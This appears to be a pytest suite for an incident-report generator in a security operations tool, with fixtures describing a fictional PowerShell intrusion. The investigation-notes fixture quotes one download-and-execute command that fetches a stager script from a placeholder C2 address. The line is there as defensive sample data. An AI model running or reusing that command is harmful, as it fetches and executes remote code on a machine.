"""
Tests for the Incident Report Generation Module
=================================================
Covers:
  - Markdown rendering (full + minimal inputs)
  - MITRE technique table formatting
  - IOC section rendering
  - Timeline section rendering
  - PDF export smoke test (skipped if weasyprint unavailable)
  - ReportRequest validation (Pydantic)
  - ReportResult fields
  - File persistence (md + pdf paths)
  - ReportMetadata recovery from saved Markdown
  - API endpoint schemas (FastAPI TestClient)
"""

from __future__ import annotations

import json
import re
import tempfile
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional
from unittest.mock import MagicMock, patch

import pytest

# ── Module under test ─────────────────────────────────────────────────────────
from app.models.report import (
    AlertAnalysisInput,
    IOCSummary,
    MitreMatchInput,
    ReportFormat,
    ReportRequest,
    ReportResult,
    ReportSeverity,
    TimelineEvent,
)
from app.services.report_generator import IncidentReportGenerator, _confidence_bar, _format_dt

# ── Fixtures ──────────────────────────────────────────────────────────────────


def _make_analysis() -> AlertAnalysisInput:
    return AlertAnalysisInput(
        summary=(
            "Suspicious PowerShell activity was detected executing an encoded command "
            "on workstation WS-042. The command retrieved a remote payload consistent "
            "with T1059.001 (PowerShell) execution patterns."
        ),
        risk_assessment=(
            "HIGH severity. Encoded PowerShell commands are a common technique used "
            "by ransomware loaders and APT initial-access tools. Immediate investigation "
            "is required to prevent lateral movement."
        ),
        investigation_steps=[
            "Review full PowerShell ScriptBlock logs on WS-042.",
            "Decode the Base64 payload and extract IOCs.",
            "Check parent process (cmd.exe / scheduled task) for persistence mechanism.",
            "Correlate with authentication logs for user jdoe over the past 48 hours.",
        ],
        recommended_actions=[
            "Isolate WS-042 from the network pending investigation.",
            "Reset credentials for user jdoe immediately.",
            "Block the C2 IP 198.51.100.42 at the perimeter firewall.",
            "Escalate to Tier-3 IR team if lateral movement is confirmed.",
        ],
    )


def _make_mitre_matches() -> List[MitreMatchInput]:
    return [
        MitreMatchInput(
            technique_id="T1059",
            technique_name="Command and Scripting Interpreter",
            tactic="Execution",
            tactic_id="TA0002",
            sub_technique="PowerShell",
            sub_technique_id="T1059.001",
            confidence=0.95,
            mapping_method="exact_id",
            rationale="Explicit technique ID 'T1059' found in alert text",
        ),
        MitreMatchInput(
            technique_id="T1027",
            technique_name="Obfuscated Files or Information",
            tactic="Defense Evasion",
            tactic_id="TA0005",
            confidence=0.72,
            mapping_method="keyword",
            rationale="Matched tokens: encoded, obfuscated, base64",
        ),
    ]


def _make_iocs() -> List[IOCSummary]:
    return [
        IOCSummary(
            value="198.51.100.42",
            ioc_type="ip",
            malicious=True,
            reputation_score=95.0,
            sources=["VirusTotal", "AlienVault"],
            tags=["c2", "apt"],
        ),
        IOCSummary(
            value="malware-dropper.exe",
            ioc_type="hash",
            malicious=True,
            reputation_score=87.5,
            sources=["CrowdStrike"],
            tags=["dropper"],
        ),
        IOCSummary(
            value="legitdomain.com",
            ioc_type="domain",
            malicious=False,
            reputation_score=2.0,
            sources=["Cisco Umbrella"],
            tags=[],
        ),
    ]


def _make_timeline() -> List[TimelineEvent]:
    return [
        TimelineEvent(
            timestamp=datetime(2026, 6, 29, 1, 0, 0),
            event_type="detection",
            description="SIEM rule fired: Suspicious PowerShell Encoded Command",
            actor="system",
            reference_id="ALERT-001",
        ),
        TimelineEvent(
            timestamp=datetime(2026, 6, 29, 1, 5, 0),
            event_type="action",
            description="Analyst acknowledged the alert and began triage.",
            actor="jdoe-analyst",
        ),
        TimelineEvent(
            timestamp=datetime(2026, 6, 29, 1, 20, 0),
            event_type="note",
            description="Decoded payload confirmed malicious: downloads second-stage RAT.",
            actor="jdoe-analyst",
        ),
    ]


def _make_request(
    severity: ReportSeverity = ReportSeverity.HIGH,
    fmt: ReportFormat = ReportFormat.MARKDOWN,
    with_iocs: bool = True,
    with_timeline: bool = True,
    with_appendix: bool = True,
) -> ReportRequest:
    return ReportRequest(
        incident_id="INC-2026-0042",
        title="Suspicious PowerShell Execution — Workstation WS-042",
        severity=severity,
        status="Investigating",
        analyst_name="Jane Analyst",
        analyst_email="jane.analyst@example.com",
        organization="Acme Corp SOC",
        detected_at=datetime(2026, 6, 29, 1, 0, 0),
        reported_at=datetime(2026, 6, 29, 1, 5, 0),
        affected_hosts=["WS-042.acme.local"],
        affected_users=["jdoe"],
        source_system="SIEM / ELK",
        alert_analysis=_make_analysis(),
        mitre_matches=_make_mitre_matches(),
        investigation_notes=(
            "## Initial Triage\n\n"
            "User `jdoe` ran `powershell.exe -enc <base64>` at 01:00 UTC.\n"
            "Decoded payload contacted C2 at 198.51.100.42 port 443.\n\n"
            "## Decoded Payload\n\n"
            "```powershell\n"
            "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/stager.ps1')\n"
            "```"
        ),
        iocs=_make_iocs() if with_iocs else [],
        timeline=_make_timeline() if with_timeline else [],
        tags=["powershell", "apt", "initial-access"],
        raw_alert_metadata={"host": "WS-042", "user": "jdoe", "severity": "high"},
        include_appendix=with_appendix,
        classification="APT / Execution",
        format=fmt,
    )


# ── Helper ────────────────────────────────────────────────────────────────────


@pytest.fixture
def generator(tmp_path: Path) -> IncidentReportGenerator:
    """Return a generator that writes files to a temp directory."""
    return IncidentReportGenerator(reports_dir=tmp_path, pdf_enabled=False)


# ── Unit tests: _confidence_bar ───────────────────────────────────────────────


def test_confidence_bar_full() -> None:
    bar = _confidence_bar(1.0, width=10)
    assert "██████████" in bar
    assert "100%" in bar


def test_confidence_bar_half() -> None:
    bar = _confidence_bar(0.5, width=10)
    assert "█████" in bar
    assert " 50%" in bar


def test_confidence_bar_zero() -> None:
    bar = _confidence_bar(0.0, width=10)
    assert "░░░░░░░░░░" in bar
    assert "  0%" in bar


# ── Unit tests: _format_dt ────────────────────────────────────────────────────


def test_format_dt_with_datetime() -> None:
    dt = datetime(2026, 6, 29, 12, 30, 0)
    result = _format_dt(dt)
    assert "2026-06-29" in result
    assert "12:30:00" in result


def test_format_dt_none() -> None:
    assert _format_dt(None) == "N/A"


# ── Unit tests: Markdown rendering ────────────────────────────────────────────


class TestGenerateMarkdown:
    def test_contains_title(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "Suspicious PowerShell Execution" in md

    def test_contains_incident_id(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "INC-2026-0042" in md

    def test_contains_severity_badge(self, generator: IncidentReportGenerator) -> None:
        req = _make_request(severity=ReportSeverity.HIGH)
        md = generator.generate_markdown(req)
        assert "HIGH" in md

    def test_executive_summary_section(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "Executive Summary" in md
        assert "PowerShell activity" in md

    def test_risk_assessment_section(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "Risk Assessment" in md
        assert "lateral movement" in md

    def test_mitre_section_present(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "MITRE ATT&CK" in md
        # T1059 is combined with its sub-technique: `T1059 / T1059.001`
        assert "T1059" in md
        assert "T1027" in md

    def test_mitre_confidence_bar_in_table(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        # 95% confidence → 10 filled blocks out of 10
        assert "██████████" in md

    def test_mitre_sub_technique_shown(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "T1059.001" in md
        assert "PowerShell" in md

    def test_investigation_notes_included(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "Investigation Notes" in md
        assert "Initial Triage" in md
        assert "198.51.100.42" in md  # appears in notes AND IOC table

    def test_investigation_steps_ordered_list(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "Investigation Steps" in md
        assert "1. Review full PowerShell ScriptBlock" in md

    def test_recommended_actions_present(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "Remediation Actions" in md
        assert "Isolate WS-042" in md

    def test_ioc_table_present(self, generator: IncidentReportGenerator) -> None:
        req = _make_request(with_iocs=True)
        md = generator.generate_markdown(req)
        assert "Indicators of Compromise" in md
        assert "198.51.100.42" in md
        assert "⛔ MALICIOUS" in md
        assert "✓ Clean" in md

    def test_ioc_section_absent_when_empty(self, generator: IncidentReportGenerator) -> None:
        req = _make_request(with_iocs=False)
        md = generator.generate_markdown(req)
        assert "Indicators of Compromise" not in md

    def test_timeline_chronologically_ordered(self, generator: IncidentReportGenerator) -> None:
        req = _make_request(with_timeline=True)
        md = generator.generate_markdown(req)
        assert "Forensic Event Timeline" in md
        # Events should appear in order 01:00 → 01:05 → 01:20
        idx_0100 = md.index("01:00:00")
        idx_0105 = md.index("01:05:00")
        idx_0120 = md.index("01:20:00")
        assert idx_0100 < idx_0105 < idx_0120

    def test_timeline_absent_when_empty(self, generator: IncidentReportGenerator) -> None:
        req = _make_request(with_timeline=False)
        md = generator.generate_markdown(req)
        assert "Forensic Event Timeline" not in md

    def test_appendix_included(self, generator: IncidentReportGenerator) -> None:
        req = _make_request(with_appendix=True)
        md = generator.generate_markdown(req)
        assert "Appendix" in md
        assert "Raw Alert Metadata" in md
        assert '"host"' in md or "host" in md

    def test_appendix_absent_when_no_metadata(self, generator: IncidentReportGenerator) -> None:
        req = _make_request(with_appendix=False)
        md = generator.generate_markdown(req)
        # Even if include_appendix=False, appendix should not appear
        assert "Appendix" not in md

    def test_footer_contains_sentinel_ai(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "Sentinel-AI" in md

    def test_confidential_banner(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "CONFIDENTIAL" in md

    def test_affected_hosts_shown(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "WS-042.acme.local" in md

    def test_affected_users_shown(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        md = generator.generate_markdown(req)
        assert "jdoe" in md

    def test_critical_severity(self, generator: IncidentReportGenerator) -> None:
        req = _make_request(severity=ReportSeverity.CRITICAL)
        md = generator.generate_markdown(req)
        assert "CRITICAL" in md

    def test_minimal_request_no_mitre_no_iocs(self, generator: IncidentReportGenerator) -> None:
        """Ensure the generator handles an absolutely minimal request."""
        req = ReportRequest(
            incident_id="INC-MIN-001",
            title="Minimal Test Incident",
            alert_analysis=AlertAnalysisInput(
                summary="Test summary.",
                risk_assessment="Low risk.",
                investigation_steps=["Step 1"],
                recommended_actions=["Action 1"],
            ),
        )
        md = generator.generate_markdown(req)
        assert "Minimal Test Incident" in md
        assert "Test summary" in md
        assert "Step 1" in md


# ── Unit tests: File persistence ─────────────────────────────────────────────


class TestFileOutput:
    def test_markdown_file_saved(self, generator: IncidentReportGenerator, tmp_path: Path) -> None:
        req = _make_request(fmt=ReportFormat.MARKDOWN)
        result = generator.generate_report(req)
        assert result.markdown_path is not None
        saved = Path(result.markdown_path)
        assert saved.exists()
        content = saved.read_text(encoding="utf-8")
        assert "INC-2026-0042" in content

    def test_report_id_in_filename(
        self, generator: IncidentReportGenerator, tmp_path: Path
    ) -> None:
        req = _make_request(fmt=ReportFormat.MARKDOWN)
        result = generator.generate_report(req)
        assert result.report_id in str(result.markdown_path)

    def test_word_count_nonzero(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        result = generator.generate_report(req)
        assert result.word_count > 50

    def test_mitre_technique_count(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        result = generator.generate_report(req)
        assert result.mitre_technique_count == 2

    def test_ioc_count(self, generator: IncidentReportGenerator) -> None:
        req = _make_request(with_iocs=True)
        result = generator.generate_report(req)
        assert result.ioc_count == 3

    def test_has_pdf_false_when_disabled(self, generator: IncidentReportGenerator) -> None:
        req = _make_request(fmt=ReportFormat.BOTH)
        result = generator.generate_report(req)
        # generator has pdf_enabled=False
        assert result.has_pdf is False
        assert result.pdf_path is None

    def test_pdf_enabled_calls_weasyprint(self, tmp_path: Path) -> None:
        """With pdf_enabled + weasyprint mocked, pdf_path should be set."""
        fake_pdf = b"%PDF-1.4 fake content"

        with patch(
            "app.services.report_generator._WEASYPRINT_AVAILABLE", True
        ), patch(
            "app.services.report_generator._WeasyprintHTML"
        ) as mock_html_cls:
            mock_html_instance = MagicMock()
            mock_html_instance.write_pdf.return_value = fake_pdf
            mock_html_cls.return_value = mock_html_instance

            gen = IncidentReportGenerator(reports_dir=tmp_path, pdf_enabled=True)
            req = _make_request(fmt=ReportFormat.BOTH)
            result = gen.generate_report(req)

        assert result.has_pdf is True
        assert result.pdf_path is not None
        saved_pdf = Path(result.pdf_path)
        assert saved_pdf.exists()
        assert saved_pdf.read_bytes() == fake_pdf


# ── Unit tests: Metadata recovery ────────────────────────────────────────────


class TestMetadataRecovery:
    def test_get_markdown_returns_content(
        self, generator: IncidentReportGenerator
    ) -> None:
        req = _make_request(fmt=ReportFormat.MARKDOWN)
        result = generator.generate_report(req)
        md = generator.get_markdown(result.report_id)
        assert md is not None
        assert "INC-2026-0042" in md

    def test_get_markdown_returns_none_for_unknown_id(
        self, generator: IncidentReportGenerator
    ) -> None:
        assert generator.get_markdown("nonexistent-id-000") is None

    def test_get_report_metadata_recovers_incident_id(
        self, generator: IncidentReportGenerator
    ) -> None:
        req = _make_request(fmt=ReportFormat.MARKDOWN)
        result = generator.generate_report(req)
        meta = generator.get_report_metadata(result.report_id)
        assert meta is not None
        assert meta.report_id == result.report_id

    def test_get_report_metadata_returns_none_for_unknown(
        self, generator: IncidentReportGenerator
    ) -> None:
        assert generator.get_report_metadata("does-not-exist") is None

    def test_get_pdf_bytes_returns_none_when_no_pdf(
        self, generator: IncidentReportGenerator
    ) -> None:
        req = _make_request(fmt=ReportFormat.MARKDOWN)
        result = generator.generate_report(req)
        assert generator.get_pdf_bytes(result.report_id) is None


# ── Unit tests: Pydantic model validation ─────────────────────────────────────


class TestReportRequestValidation:
    def test_valid_request_passes(self) -> None:
        req = _make_request()
        assert req.incident_id == "INC-2026-0042"

    def test_title_too_short_raises(self) -> None:
        with pytest.raises(Exception):  # pydantic ValidationError
            ReportRequest(
                incident_id="X",
                title="AB",  # min_length=5
                alert_analysis=AlertAnalysisInput(
                    summary="S", risk_assessment="R"
                ),
            )

    def test_default_analyst_name(self) -> None:
        req = ReportRequest(
            incident_id="INC-001",
            title="Test Incident",
            alert_analysis=AlertAnalysisInput(
                summary="s", risk_assessment="r"
            ),
        )
        assert req.analyst_name == "SOC Analyst"

    def test_format_defaults_to_both(self) -> None:
        req = ReportRequest(
            incident_id="INC-001",
            title="Test Incident",
            alert_analysis=AlertAnalysisInput(
                summary="s", risk_assessment="r"
            ),
        )
        assert req.format == ReportFormat.BOTH

    def test_mitre_confidence_out_of_range_raises(self) -> None:
        with pytest.raises(Exception):
            MitreMatchInput(
                technique_id="T1059",
                technique_name="Test",
                tactic="Execution",
                tactic_id="TA0002",
                confidence=1.5,  # > 1.0 → invalid
                mapping_method="keyword",
            )


# ── ReportResult model ────────────────────────────────────────────────────────


class TestReportResult:
    def test_result_has_report_id(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        result = generator.generate_report(req)
        assert result.report_id
        assert len(result.report_id) == 36  # UUID4

    def test_result_incident_id_matches_request(
        self, generator: IncidentReportGenerator
    ) -> None:
        req = _make_request()
        result = generator.generate_report(req)
        assert result.incident_id == req.incident_id

    def test_result_markdown_not_empty(self, generator: IncidentReportGenerator) -> None:
        req = _make_request()
        result = generator.generate_report(req)
        assert len(result.markdown_content) > 100
